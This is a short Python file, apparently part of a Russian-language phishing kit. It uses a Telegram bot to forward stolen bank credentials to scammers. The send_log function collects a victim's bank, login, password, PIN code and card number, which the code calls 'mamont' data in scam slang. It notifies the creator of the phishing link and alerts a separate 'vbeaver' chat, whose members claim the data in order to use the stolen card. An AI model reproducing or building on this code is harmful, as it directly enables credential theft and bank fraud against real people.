from aiogram import Bot
from aiogram.enums import ParseMode
from database.db import Database
from config import logger, data
from keyboards.inline import take_for_vbeav
db = Database()


async def send_log(
    bank: str,
    login: str,
    password: str,
    pin_code: str,
    card_number: str,
    code: str
):
    logger.debug(code)
    endpoint = await db.get_endpoint(code)
    creator = endpoint['creator']
    bot_id = endpoint['bot_id']
    bot_info = await db.get_bot_info(bot_id)
    token = bot_info['token']
    vbeaver_chat = bot_info['vbeaver_chat']
    bot = Bot(token)
    mamont_data = {
        "bank": bank.upper(),
        "login": login,
        "password": password,
        "pin_code": pin_code,
        "card_number": card_number
    }
    data[code] = mamont_data
    await bot.send_message(
        chat_id=creator,
        text="🦣 <i>По вашей ссылке перешел мамонт и ввел данные, ожидание вбивера.</i>",
        parse_mode=ParseMode.HTML
    )
    await bot.send_message(
        chat_id=vbeaver_chat,
        text=f"""🦣 <b>Новый мамонт:</b>
🌐 <b>Bank:</b><code> Скрыто</code>
📥 <b>Login:</b><code> Скрыто</code>
🔑 <b>Password:</b><code> Скрыто</code>
🔑 <b>Pin-Code:</b><code> Скрыто</code>
💳 <b>Card Number:</b><code> Скрыто</code>""",
        parse_mode=ParseMode.HTML,
        reply_markup=take_for_vbeav(code)
    )